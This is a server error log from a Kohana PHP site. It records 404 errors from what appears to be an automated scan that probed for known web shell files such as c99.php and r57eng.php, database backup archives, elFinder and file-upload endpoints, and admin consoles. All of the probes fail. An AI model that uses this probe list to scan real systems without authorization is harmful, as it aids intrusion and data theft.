2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: i.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c99.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c99.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nstview.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nstview.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ;971471@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ;971471@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nst.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Vagrantfile.backup ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nst.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Vagrantfile.backup ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rst.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rst.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: temp.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: temp.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113_db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bower.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bower.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57eng.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57eng.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: composer.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: composer.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dra.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dra.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: create.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: composer.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: composer.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yarn.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yarn.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lol.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lol.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: uploads/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: uploads/elFinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gulpfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gulpfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: uploads/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: uploads/elfinder/php/connector.minimal.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gulpfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gulpfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ; ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gulpfile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gulpfile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webtools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webtools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server/TCPIPGEN.htm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server/TCPIPGEN.htm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zehir.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zehir.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL system/console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL system/console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cacti was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cacti was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL axis2/axis2-admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL axis2/axis2-admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.sql.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL axis2/axis2-admin/welcome was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL axis2/axis2-admin/welcome was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL jQuery-File-Upload/server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL jQuery-File-Upload/server/php was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL host-manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL host-manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL zabbix was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL zabbix was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: applet.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: applet.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL nagios was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL nagios was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _ignition/health-check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _ignition/health-check was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ui/authentication was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ui/authentication was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL extrahop was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL extrahop was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL otrs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL otrs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL rockmongo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL rockmongo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
